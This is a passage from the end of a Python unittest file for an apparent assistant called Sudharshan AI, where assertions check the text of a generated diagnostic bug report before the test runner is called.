            self.assertIn("Sudharshan AI (Alpha v0.9) Diagnostic Bug Report", content_bug)
            self.assertIn("local model slow on older cpu", content_bug)


if __name__ == "__main__":
    unittest.main(verbosity=2)
